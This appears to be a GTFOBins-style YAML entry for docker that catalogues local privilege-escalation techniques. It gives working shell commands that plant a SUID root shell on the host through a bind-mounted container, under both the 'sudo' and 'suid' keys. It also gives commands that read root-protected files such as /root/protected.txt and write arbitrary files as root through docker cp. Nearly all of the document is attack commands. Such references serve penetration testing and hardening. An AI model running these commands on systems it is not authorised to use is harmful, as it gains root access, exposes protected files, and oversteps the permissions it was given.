---
functions:
  sudo:
    - description: Exploit the fact that Docker runs as root to create a SUID binary on the host using a container. This requires the user to be privileged enough to run docker, e.g. being in the `docker` group. Any other Docker Linux image should work, e.g., `debian`.
      code: |
        sudo docker run --rm -v /home/$USER:/h_docs ubuntu \
            sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p
    - description: Read any file by copying it to an existing container and back to a new location on the host. 
      code: |
        CONTAINER_ID=existing-docker-container
        sudo docker cp /root/protected.txt $CONTAINER_ID:/tmp/file.txt
        sudo docker cp $CONTAINER_ID:/tmp/file.txt /home/user/file.txt
        cat /home/user/file.txt
    - description: Write any file by copying it to an existing container and back to the target destination on the host. The file will be owned by root.
      code: |
        CONTAINER_ID=existing-docker-container
        echo "sensitive config" > /tmp/file.txt
        sudo docker cp /tmp/file.txt $CONTAINER_ID:/tmp/file.txt
        sudo docker cp $CONTAINER_ID:/tmp/file.txt /target/destination.txt
  suid:
    - description: Exploit the fact that Docker runs as root to create a SUID binary on the host using a container. This requires the user to be privileged enough to run docker, e.g. being in the `docker` group. Any other Docker Linux image should work, e.g., `debian`.
      code: |
        ./docker run --rm -v /home/$USER:/h_docs ubuntu \
            sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p
---
